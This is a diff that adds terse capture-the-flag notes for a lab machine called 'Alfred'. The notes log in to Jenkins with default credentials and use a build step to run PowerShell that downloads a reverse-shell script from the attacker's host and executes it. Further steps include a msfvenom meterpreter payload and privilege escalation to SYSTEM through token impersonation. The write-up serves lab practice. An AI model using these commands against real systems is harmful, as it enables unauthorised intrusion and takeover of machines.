@@ -1,0 +1,38 @@
+Alfred
+- *nmap -A -T4 -Pn 10.201.52.143*
+	- port 80 - http
+	- port 3389 
+	- port 8080 - http
+- browser: 10.201.52.143:8080
+	- jenkins login screen
+	- admin:admin owrks *eye roll*
+- navigate to "project 1" -> "Configure" change whoami to command provided, first IP to fetch file from our http, second to our nc listener
+- *python -m http.server 4444*
+- *nc -nlvp 4445*
+- *powershell iex (New-Object Net.WebClient).DownloadString('http://10.23.172.46:4444/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.23.172.46 -Port 4445*
+- *type ..\secret.key*
+	cb2ae36e1862a23b3adfd393282eae76f896f2efb0a4da79643e33afc616751e
+- *type Users\bruce\Desktop\user.txt*
+- lab guided:
+	- switch to meterpreter shell, Kali: *msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.23.172.46 LPORT=4446 -f exe -o shell.exe*
+	- Jenkins config: *powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.23.172.46:4444/shell.exe','shell.exe')"*
+		- OR on victim: *powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.23.172.46:4444/shell.exe','shell.exe')"*
+	- msfconsole: *use exploit/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST 10.23.172.46 set LPORT 4446 run*
+	- on victim: *Start-Process "shell.exe"*
+		- spawns our meterpreter shell on the new listener
+	- *load incognito* <-- ***important to exploit this vulnerability***
+	- *getprivs*
+		- we have SeImpersonatePrivilege and SeDebugPrivilege
+	- *list_tokens -g*
+		- we see BUILTIN\Administrators
+	- *impersonate_token "BUILTIN\Administrators"*
+	- *getuid*
+		- NT AUTHORITY\SYSTEM
+	- next we need to migrate to a process with full root:
+		- Windows uses primary token of the process, not the impersonate token
+	- *ps*
+		- find the pid of services.exe
+	- *migrate PIDofServices*
+		- grants us full root priv
+	- *cd ../../../Windows/System32/config*
+	- *cat root.txt*
